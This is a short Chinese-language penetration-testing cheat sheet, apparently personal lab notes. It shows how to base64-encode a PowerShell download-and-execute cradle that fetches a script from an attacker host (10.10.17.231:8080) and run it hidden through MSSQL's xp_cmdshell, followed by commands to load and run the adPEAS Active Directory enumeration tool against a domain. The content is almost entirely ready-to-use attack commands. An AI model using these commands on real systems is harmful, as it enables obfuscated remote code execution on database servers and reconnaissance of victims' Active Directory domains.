# 加密的mssql命令
使用powershell encode上面的字符串

```
PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.17.231:8080/w1"))'
PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA
```

使用上面的加密串在msqll server执行下面的命令

格式：
```
EXEC xp_cmdshell 'powershell -w hidden -enc <这里是加密命令>
```


# adPEAS

## 引入
```
powershell-import tools/adPEAS/adPEAS.ps1
```
或者
```
. .\adPEAS.ps1
```

或者
```
Import-Module .\adPEAS.ps1
```

## 执行
```
Invoke-adPEAS
```

```
Invoke-adPEAS -Domain 'm3c.local' -Outputfile 'C:\ActiveMQ\m3c_adPEAS_outputfile' 
```